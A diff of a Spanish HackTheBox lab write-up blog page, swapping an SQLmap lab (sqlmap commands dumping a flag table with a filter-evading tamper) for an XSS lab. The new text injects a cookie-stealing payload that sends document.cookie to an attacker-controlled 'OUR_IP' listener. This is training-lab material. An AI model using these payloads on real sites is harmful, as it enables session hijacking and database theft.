@@ -3,50 +3,50 @@
 
 <head><title>
     
-    Laboratorio De Fundamentos De SQLmap | 
+    Laboratorio De XSS | 
     
     CHL Blog
 </title>
 
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-fundamentos-de-sqlmap/" />
+<link rel="canonical" href="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-xss/" />
 <link rel="icon" type="image/png" href="https://chlorenzo.com/image/favicon.ico">
 
 
 <meta name="description" content="
-    En este laboratorio utilizamos SQLmap para identificar y explotar una vulnerabilidad de SQLi. Tras interceptar una petición POST, guardamos la solicitud y la analizamos con SQLmap, que nos da una recomendación para evadir filtros.  Exploramos la base de datos y dentro de ella la tabla final_flag, la cual logramos dumpear exitosamente.
+    Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.
     "
 />
 <meta property="og:description" content="
-    En este laboratorio utilizamos SQLmap para identificar y explotar una vulnerabilidad de SQLi. Tras interceptar una petición POST, guardamos la solicitud y la analizamos con SQLmap, que nos da una recomendación para evadir filtros.  Exploramos la base de datos y dentro de ella la tabla final_flag, la cual logramos dumpear exitosamente.
+    Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.
     " 
 />
 
 
 
 
-<meta property="og:title" content="Laboratorio de Fundamentos de SQLmap" />
+<meta property="og:title" content="Laboratorio de XSS" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-fundamentos-de-sqlmap/" /><meta property="article:section" content="pagina_web" />
-<meta property="article:published_time" content="2025-08-25T00:00:00+00:00" />
-<meta property="article:modified_time" content="2025-08-25T00:00:00+00:00" />
+<meta property="og:url" content="https://chlorenzo.com/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-xss/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-08-30T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-08-30T00:00:00+00:00" />
 
 
 
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Laboratorio de Fundamentos de SQLmap">
-  <meta name="twitter:description" content="En este laboratorio utilizamos SQLmap para identificar y explotar una vulnerabilidad de SQLi. Tras interceptar una petición POST, guardamos la solicitud y la analizamos con SQLmap, que nos da una recomendación para evadir filtros. Exploramos la base de datos y dentro de ella la tabla final_flag, la cual logramos dumpear exitosamente.">
+  <meta name="twitter:title" content="Laboratorio de XSS">
+  <meta name="twitter:description" content="Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.">
 
 
-  <meta itemprop="name" content="Laboratorio de Fundamentos de SQLmap">
-  <meta itemprop="description" content="En este laboratorio utilizamos SQLmap para identificar y explotar una vulnerabilidad de SQLi. Tras interceptar una petición POST, guardamos la solicitud y la analizamos con SQLmap, que nos da una recomendación para evadir filtros. Exploramos la base de datos y dentro de ella la tabla final_flag, la cual logramos dumpear exitosamente.">
-  <meta itemprop="datePublished" content="2025-08-25T00:00:00+00:00">
-  <meta itemprop="dateModified" content="2025-08-25T00:00:00+00:00">
-  <meta itemprop="wordCount" content="254">
-  <meta itemprop="keywords" content="Hackthebox,SQLi,Web">
+  <meta itemprop="name" content="Laboratorio de XSS">
+  <meta itemprop="description" content="Exploramos la aplicación, identificamos un formulario que permite inyectar código malicioso en los campos de entrada. Usamos un payload de JavaScript para redirigir las cookies de sesión hacia nuestro servidor. Obteniendo la cookie que contenía la flag.">
+  <meta itemprop="datePublished" content="2025-08-30T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-08-30T00:00:00+00:00">
+  <meta itemprop="wordCount" content="293">
+  <meta itemprop="keywords" content="Hackthebox,XSS,Web">
 
 
 
@@ -292,17 +292,17 @@
             <div class="col-md-12 col-lg-8 px-lg-4">
                 
 
-                <h1 class="title">Laboratorio de Fundamentos de SQLmap</h1>
+                <h1 class="title">Laboratorio de XSS</h1>
 
                 <div class="container-fluid px-0 mb-4">
                     <div class="row align-items-end">
                         <div class="col-md-4 date-time">
                             <span class="date">
-    Aug 25, 2025
+    Aug 30, 2025
 </span>
                             &centerdot;
                             <span class="time-to-read">
-    1 min read</span>
+    2 mins read</span>
                         </div>
 
                         <div class="col-md-8 tags ">
@@ -310,8 +310,8 @@
                             <a href="https://chlorenzo.com/tags/hackthebox"><span
                                     class="tag bg-dark">hackthebox</span></a>
                             
-                            <a href="https://chlorenzo.com/tags/sqli"><span
-                                    class="tag bg-dark">SQLi</span></a>
+                            <a href="https://chlorenzo.com/tags/xss"><span
+                                    class="tag bg-dark">XSS</span></a>
                             
                             <a href="https://chlorenzo.com/tags/web"><span
                                     class="tag bg-dark">web</span></a>
@@ -322,27 +322,33 @@
 
                 
 
-                <p><img src="../../../../../images/Miniaturas/sqlmap.png" alt=""></p>
+                <p><img src="../../../../../images/Miniaturas/sqlmap.pn" alt=""></p>
 <h4 id="enunciado">Enunciado</h4>
-<p>Se le otorga acceso a una aplicación web con mecanismos de protección básicos. Utilice las habilidades aprendidas en este módulo para identificar la vulnerabilidad SQLi con SQLMap y explotarla como corresponda. Para completar este módulo, busque la vulnerabilidad y envíela aquí.</p>
-<p><strong>¿Cuál es el contenido de la tabla final_flag?</strong>
-Vamos a la dirección url que nos dan y vemos esto:</p>
-<p><img src="../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-1.png" alt=""></p>
-<p>Hacemos un poco de investigación de la página.
-Y vemos que al añadir un producto al carrito tenemos una solicitud <code>POST</code> con un <code>id</code>, con esta solicitud vamos a intentar empezar. Guardamos la solicitud en un archivo,  <code>action.txt.</code></p>
-<p><img src="../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-2.png" alt="">
-Lanzamos la acción:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r action.txt --batch
-</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-3.png" alt="">
-Y vemos que nos da información importante, nos da el gestor de Base de Datos es <code>Mysql</code>, además nos sugiere que utilicemos el <code>--tamper=between</code> porque ve que le esta bloqueando este tipo de solicitudes.
-Ponemos el parametro <code>--schema</code> para tener una visión de la BD.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r action.txt --batch --schema --tamper<span style="color:#f92672">=</span>between
-</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-4.png" alt="">
-Y vemos una BD llamada production donde una de las tablas es final_flag. Que es lo que nos están preguntando.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r action.txt --batch -D production -T final_flag --tamper between --dump
-</span></span></code></pre></div><p>Intentamos dumpear los datos de la tabla que nos interesa:</p>
-<p><img src="../../../../../images/HTB_modulos/SQLmap_lab_1/flag_1-5.png" alt=""></p>
-<p>Es posible que luego de varias consultas en sqlmap te bloquee la aplicación y no te devuelva los resultados esperados, se recomienda resetear la instancia de HTB.</p>
+<p>Estamos realizando una prueba de penetración de aplicaciones web para una empresa que lo contrató y que acaba de lanzar su nuevo [ <code>Security Blog</code>nombre del sitio]. En nuestro plan de pruebas de penetración de aplicaciones web, llegamos a la parte donde debe probar la aplicación web contra vulnerabilidades de secuencias de comandos entre sitios (XSS).</p>
+<p>Inicie el servidor a continuación, asegúrese de estar conectado a la VPN y acceda al <code>/assessment</code>directorio en el servidor usando el navegador.</p>
+<p>Aplica las habilidades que aprendiste en este módulo para lograr lo siguiente:</p>
+<ol>
+<li>Identificar un campo de entrada de usuario que sea vulnerable a una vulnerabilidad XSS</li>
+<li>Encuentre una carga útil XSS que funcione y que ejecute código JavaScript en el navegador del destino</li>
+<li>Usando las <code>Session Hijacking</code>técnicas, intenta robar las cookies de la víctima, que deben contener la bandera.</li>
+</ol>
+<p><strong>¿Cuál es el valor de la cookie &lsquo;bandera&rsquo;?</strong>
+Primero visitamos la ruta que nos dicen y de primeras vemos un blog wordpress.
+<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-1.png" alt="">
+Empezamos a buscar campos en los que tengamos capacidad de introducir datos para ver si vemos alguno vulnerable a <code>XSS</code>.
+Vemos que tenemos acceso a otra página del blog
+<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-2.png" alt="">
+Al final de la misma página vemos que tenemos un formulatio para postear contenido en el blog.
+Con varios campos.
+<img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-3.png" alt="">
+En ellos vamos a probar con lo que nos habían comentado en el enunciado de la <code>Session Hijacking</code>.
+Vamos a ponernos en escucha en nuestra máquina local</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -S 0.0.0.0:80
+</span></span></code></pre></div><p>Insertamos el payload en cada campo exepto el email.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>document.<span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://OUR_IP?c=&#39;</span><span style="color:#f92672">+</span>document.<span style="color:#a6e22e">cookie</span>;
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-4.png" alt=""></p>
+<p>Mientras vemos que cuando hacemos la petición capturamos la cookie de sesión con la flag.</p>
+<p><img src="../../../../../images/HTB_modulos/XSS_htb_lab_1/flag_1-5.png" alt=""></p>
 <p>Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
 
 
